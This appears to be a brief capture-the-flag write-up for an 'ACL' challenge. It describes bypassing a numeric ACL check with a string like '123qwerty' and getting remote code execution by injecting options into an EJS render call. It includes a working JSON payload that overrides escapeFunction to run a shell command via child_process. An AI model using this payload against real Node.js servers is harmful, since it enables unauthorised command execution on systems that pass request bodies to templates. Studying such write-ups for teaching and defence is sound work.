# ACL

This challenge had two steps to it:

## Bypassing The ACL Check

We had to bypass the `ACL > 1` check, the easy solution was to send a string that would be parsed by `parseInt()` as a `> 1` number and still be false in (`ACL > 1`) comparison (e.g `"123qwerty"`).

## Getting an RCE

This would be done by injecting evil javascript code to the ejs framework (in the `render()` method) which is enabled by the fact that it's used unsecurly (`res.render('template.ejs', req.body)`) which is mentioned in their `SECURITY.md` document, one obstacle that would occur is that the template would be cached already and the injected code wouldn't actually get run, but that could be resolve by disabling cache, here is the payload:

```json
{
  "cache": false,
  "settings": {
    "view options": {
      "escapeFunction": "console.log;this.global.process.mainModule.require(\"child_process\").execSync(\"touch /tmp/pwned\");",
      "client": "true"
    },
    "view cache": false
  },
  "flag": "ABC"
}
```
